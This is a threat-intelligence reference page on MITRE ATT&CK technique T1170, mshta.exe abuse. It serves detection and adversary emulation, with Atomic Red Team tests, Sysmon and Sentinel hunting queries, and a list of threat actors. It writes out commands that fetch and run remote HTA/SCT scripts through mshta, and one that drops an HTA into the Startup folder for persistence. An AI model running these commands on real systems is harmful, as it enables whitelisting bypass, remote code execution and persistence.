
# Mshta

## Description

### MITRE Description

> Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension <code>.hta</code>. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)

Adversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) 

Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))</code>

They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>

Mshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)

## Additional Attributes

* Bypass: ['Application whitelisting', 'Digital Certificate Validation']
* Effective Permissions: None
* Network: intentionally left blank
* Permissions: ['User']
* Platforms: ['Windows']
* Remote: intentionally left blank
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1170

## Potential Commands

```
mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/mshta.sct')).Exec();close();

mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -noexit -file PathToAtomicsFolder\T1170\src\powershell.ps1"":close")

$var =Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/T1170.hta"
$var.content|out-file "#{temp_file}"
mshta "#{temp_file}"

$var =Invoke-WebRequest "#{hta_url}"
$var.content|out-file "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1170.hta"
mshta "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1170.hta"

\\windows\\.+\\mshta.exevbscript|javascript|http|https
```

## Commands Dataset

```
[{'command': 'mshta.exe '
             "javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/mshta.sct')).Exec();close();\n",
  'name': None,
  'source': 'atomics/T1170/T1170.yaml'},
 {'command': 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run '
             '""powershell -noexit -file '
             'PathToAtomicsFolder\\T1170\\src\\powershell.ps1"":close")\n',
  'name': None,
  'source': 'atomics/T1170/T1170.yaml'},
 {'command': '$var =Invoke-WebRequest '
             '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/T1170.hta"\n'
             '$var.content|out-file "#{temp_file}"\n'
             'mshta "#{temp_file}"\n',
  'name': None,
  'source': 'atomics/T1170/T1170.yaml'},
 {'command': '$var =Invoke-WebRequest "#{hta_url}"\n'
             '$var.content|out-file "$env:appdata\\Microsoft\\Windows\\Start '
             'Menu\\Programs\\Startup\\T1170.hta"\n'
             'mshta "$env:appdata\\Microsoft\\Windows\\Start '
             'Menu\\Programs\\Startup\\T1170.hta"\n',
  'name': None,
  'source': 'atomics/T1170/T1170.yaml'},
 {'command': '\\\\windows\\\\.+\\\\mshta.exevbscript|javascript|http|https',
  'name': None,
  'source': 'SysmonHunter - Mshta'}]
```

## Potential Detections

```json

```

## Potential Queries

```json
[{'name': 'MSHTA FileAccess',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where (EventID == 11 or EventID == 15)and file_name '
           'contains ".hta"'},
 {'name': 'MSHTA Network',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 3and (process_command_line contains '
           '"mshta.exe"or process_parent_command_line contains "mshta.exe")'},
 {'name': 'MSHTA Process',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1and (process_command_line contains '
           '"mshta.exe"or process_parent_command_line contains "mshta.exe")'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - Mshta': {'atomic_tests': [{'description': 'Test '
                                                                    'execution '
                                                                    'of a '
                                                                    'remote '
                                                                    'script '
                                                                    'using '
                                                                    'mshta.exe. '
                                                                    'Upon '
                                                                    'execution '
                                                                    'calc.exe '
                                                                    'will be '
                                                                    'launched.\n',
                                                     'executor': {'command': 'mshta.exe '
                                                                             "javascript:a=(GetObject('script:#{file_url}')).Exec();close();\n",
                                                                  'elevation_required': False,
                                                                  'name': 'command_prompt'},
                                                     'input_arguments': {'file_url': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/mshta.sct',
                                                                                      'description': 'location '
                                                                                                     'of '
                                                                                                     'the '
                                                                                                     'payload',
                                                                                      'type': 'Url'}},
                                                     'name': 'Mshta executes '
                                                             'JavaScript '
                                                             'Scheme Fetch '
                                                             'Remote Payload '
                                                             'With GetObject',
                                                     'supported_platforms': ['windows']},
                                                    {'description': 'Run a '
                                                                    'local VB '
                                                                    'script to '
                                                                    'run local '
                                                                    'user '
                                                                    'enumeration '
                                                                    'powershell '
                                                                    'command.\n'
                                                                    'This '
                                                                    'attempts '
                                                                    'to '
                                                                    'emulate '
                                                                    'what FIN7 '
                                                                    'does with '
                                                                    'this '
                                                                    'technique '
                                                                    'which is '
                                                                    'using '
                                                                    'mshta.exe '
                                                                    'to '
                                                                    'execute '
                                                                    'VBScript '
                                                                    'to '
                                                                    'execute '
                                                                    'malicious '
                                                                    'code on '
                                                                    'victim '
                                                                    'systems.\n'
                                                                    'Upon '
                                                                    'execution, '
                                                                    'a new '
                                                                    'PowerShell '
                                                                    'windows '
                                                                    'will be '
                                                                    'opened '
                                                                    'that '
                                                                    'displays '
                                                                    'user '
                                                                    'information.\n',
                                                     'executor': {'command': 'mshta '
                                                                             'vbscript:Execute("CreateObject(""Wscript.Shell"").Run '
                                                                             '""powershell '
                                                                             '-noexit '
                                                                             '-file '
                                                                             'PathToAtomicsFolder\\T1170\\src\\powershell.ps1"":close")\n',
                                                                  'name': 'command_prompt'},
                                                     'name': 'Mshta executes '
                                                             'VBScript to '
                                                             'execute '
                                                             'malicious '
                                                             'command',
                                                     'supported_platforms': ['windows']},
                                                    {'description': 'Execute '
                                                                    'an '
                                                                    'arbitrary '
                                                                    'remote '
                                                                    'HTA. Upon '
                                                                    'execution '
                                                                    'calc.exe '
                                                                    'will be '
                                                                    'launched.\n',
                                                     'executor': {'cleanup_command': 'remove-item '
                                                                                     '"#{temp_file}" '
                                                                                     '-ErrorAction '
                                                                                     'Ignore\n',
                                                                  'command': '$var '
                                                                             '=Invoke-WebRequest '
                                                                             '"#{hta_url}"\n'
                                                                             '$var.content|out-file '
                                                                             '"#{temp_file}"\n'
                                                                             'mshta '
                                                                             '"#{temp_file}"\n',
                                                                  'name': 'powershell'},
                                                     'input_arguments': {'hta_url': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/T1170.hta',
                                                                                     'description': 'URL '
                                                                                                    'to '
                                                                                                    'HTA '
                                                                                                    'file '
                                                                                                    'for '
                                                                                                    'execution',
                                                                                     'type': 'string'},
                                                                         'temp_file': {'default': '$env:appdata\\Microsoft\\Windows\\Start '
                                                                                                  'Menu\\Programs\\Startup\\T1170.hta',
                                                                                       'description': 'temp_file '
                                                                                                      'location '
                                                                                                      'for '
                                                                                                      'hta',
                                                                                       'type': 'string'}},
                                                     'name': 'Mshta Executes '
                                                             'Remote HTML '
                                                             'Application '
                                                             '(HTA)',
                                                     'supported_platforms': ['windows']}],
                                   'attack_technique': 'T1170',
                                   'display_name': 'Mshta'}},
 {'SysmonHunter - T1170': {'description': None,
                           'level': 'medium',
                           'name': 'Mshta',
                           'phase': 'Execution',
                           'query': [{'process': {'cmdline': {'pattern': 'vbscript|javascript|http|https'},
                                                  'image': {'flag': 'regex',
                                                            'pattern': '\\\\windows\\\\.+\\\\mshta.exe'}},
                                      'type': 'process'}]}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)

* [Execution](../tactics/Execution.md)
    

# Mitigations

None

# Actors


* [FIN7](../actors/FIN7.md)

* [APT32](../actors/APT32.md)
    
* [MuddyWater](../actors/MuddyWater.md)
    
* [Kimsuky](../actors/Kimsuky.md)
    
